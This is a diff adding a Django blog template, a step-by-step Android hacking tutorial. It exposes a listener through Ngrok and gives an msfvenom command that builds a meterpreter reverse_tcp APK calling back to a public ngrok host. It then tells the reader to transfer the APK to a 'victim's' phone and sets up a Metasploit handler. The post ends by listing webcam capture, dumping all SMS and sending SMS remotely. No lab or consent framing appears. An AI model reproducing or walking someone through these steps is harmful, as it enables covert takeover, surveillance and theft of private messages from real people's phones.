@@ -1,0 +1,114 @@
+{% block content %}
+{% load static %}
+<center>
+<iframe height="600" width="300" src="https://www.youtube.com/embed/XhML4pehrCo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen class="card-img-top"></iframe></center>
+<br><br>
+<h5>Let’s start with our Anrdoid Hacking Technique</h5><br>
+<h4><u>Creating secure tunnels to locally host application using Ngrok:</u></h4><br>
+<h6>What Is Ngrok</h6>
+Ngrok is a useful utility to create secure tunnels to locally hosted applications using a reverse proxy. It is a utility to expose any locally hosted application over the web.
+<br>
+In simple terms, it provides a publicly accessible web URL to any locally hosted application i.e. be it a Spring boot or nodejs based web application or a webhook for a chat application, etc
+<br><br>
+<h6>How Does Ngrok Work?</h6>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/0.jpeg' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+    1. Run the local app, so that it can be accessed at your localhost.  Example: http://localhost:8080<br>
+    2. Now with ngrok executable (available for different platforms like Mac, Windows, etc.) initiate a tunnel to the localhost on the desired port. We will see this detail in the upcoming sections.<br>
+    3. Once ngrok sets up the tunnel, it provides a web-accessible URL.<br>
+    4. Now share the publicly accessible url with the end-users who would hit the locally hosted application.<br>
+    5. End users hit the web URL on the internet.<br>
+    6. When the request arrives at the ngrok server (As the URL is in a subdomain of ngrok.com the requests will initially land to ngrok server), and it will resolve the URL to the app that it needs to tunnel to.<br>
+    7. Ngrok forwards the request to the tunnel created in Step 2.<br>
+    8. The forwarded request connects to the locally hosted app.<br>
+<br>
+<h6>Installation & Setting up:</h6>
+1) First create a free account on Ngrok to get an auth token for your account. Without an auth token, you will not be able to start tunnels for the locally hosted applications.<br>
+
+2) Download client library depending on the OS you are on.<br>
+
+3) Unzip the downloaded package.<br>
+
+4) Update the ngrok configuration file with your auth token by running the following command on the terminal/command prompt.<br>
+
+<b>./ngrok authtoken {your-auth-token}</b><br>
+
+You can visit/view the config file to see if your auth token has been updated or not. The Ngrok config file is available in the user directory at location – ~/.ngrok2/ngrok.yml<br>
+
+5) Once the auth token gets updated, you should be able to start the tunnel for your locally hosted applications.<br>
+
+6) To start the tunnel on port 80 for localhost, simply execute the below command.<br>
+
+<b>./ngrok http 80</b><br><br>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_3.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+Once the above command gets executed, a tunnel gets created to the localhost:80 (Whatever application is running on this port should be accessible through the tunneled URL as shown in the above figure).<br><br>
+<h4><u>Generating payload using Msfvenom:</u></h4>
+Before we start, let’s talk about MSFvenom. It is a combination of MSFpayload and MSFencode. These tools are extremely useful for generating payloads in various formats and encoding these payloads using various encoder modules.<br>
+
+Merging these two tools into a single tool just makes sense. It standardizes the command-line options, speeds things up a bit by using a single framework instance and handles all possible output formats. MSFvenom is used to make a payload to penetrate the Android emulator.<br>
+
+By using MSFvenom, we create a payload .apk file. For this, we use the following command:<br>
+
+<i><b>Terminal: msfvenom –p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io  LPORT=19145 -a dalvik -o shoo.apk</i></b><br><br>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_1.png' %}"  alt="noimg" class="card-img-top"></div></div><br>
+<center><i><b>Figure 1: MSFvenom payload</i></b></center>
+    <b>Here,</b> We used:<br>
+    • <b>-p </b>— Payload to be used<br>
+    • <b>LHOST</b>— Localhost IP to receive a back connection (Getting from Ngrok)<br>
+    • <b>LPORT</b>— Localhost port on which the connection listen for the victim (getting from Ngrok i.e. 19145)<br>
+    • <b>R</b> — Raw format (we set shoo.apk)<br>
+    • <b>Location</b> — To save the file<br><br>
+<h5>Transfer the newely Generated app to victim's mobile phone.</h5>
+<br>
+<h4><u>Setting up listener using Metasploit</u></h4>
+You can start a handler with Metasploit at any time, this is useful when you are executing a backdoor in a victim’s machine and you need to connect back to take control. Now we’ll show you the steps you need to start your handler at the same port of your backdoor.<br>
+
+The first step is to open a session in Metasploit with the command:<br>
+# msfconsole<br>
+Now run the following commands:<br>
+
+msf> use multi/handler<br>
+
+msf  exploit(handler) > set payload android/meterpreter/reverse_tcp<br>
+
+msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 0.0.0.0)<br>
+
+msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4446)<br>
+
+msf exploit(handler) > run<br><br>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_7.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+
+<h5>Congratulations !!! we get the active session till that point. Now have a look, what we can do with this session.</h5><br>
+<h5><b><u>Using help command:</u></b></h5>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_8.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+<h5><b><u>Webcam Commands:</u></b></h5>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_9.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+<h5><b><u>Webcam list:</u></b></h5>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_10.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+<h5><b><u>Webcam snap:</u></b></h5>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_11.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+<h5><b><u>Dumping all sms:</u></b></h5>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_12.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+<h5><b><u>Send sms remotely:</u></b></h5>
+<div class="row">
+	<div class="col-12 col-md-12">
+<img src="{% static '/img/post3/10_13.png' %}"  alt="noimg" class="card-img-top"></div></div><br><br>
+<h5>That's all for today, We reached to the end of this blog, thank you for such a good reader.</h5><br>
+{% endblock %}
